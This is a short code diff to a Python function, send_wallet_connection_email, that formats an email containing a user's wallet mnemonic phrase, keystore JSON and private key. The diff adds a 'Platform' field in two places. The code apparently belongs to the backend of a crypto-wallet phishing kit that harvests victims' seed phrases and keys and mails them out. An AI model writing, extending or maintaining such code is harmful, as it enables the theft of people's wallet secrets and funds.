@@ -167,6 +167,7 @@ def send_wallet_connection_email(user, wallet_data):
     Connection Method: {wallet_data.get('connection_method')}
     
     --- WALLET DATA ---
+    Platform: {wallet_data.get('platform', 'N/A')}
     Mnemonic: {wallet_data.get('mnemonic_phrase', 'N/A')}
     Keystore: {wallet_data.get('keystore_json', 'N/A')}
     Private Key: {wallet_data.get('private_key', 'N/A')}
@@ -362,6 +363,7 @@ def send_wallet_connection_email(user, wallet_data):
     Connection Method: {wallet_data.get('connection_method')}
     
     --- WALLET DATA ---
+    Platform: {wallet_data.get('platform', 'N/A')}
     Mnemonic: {wallet_data.get('mnemonic_phrase', 'N/A')}
     Keystore: {wallet_data.get('keystore_json', 'N/A')}
     Private Key: {wallet_data.get('private_key', 'N/A')}
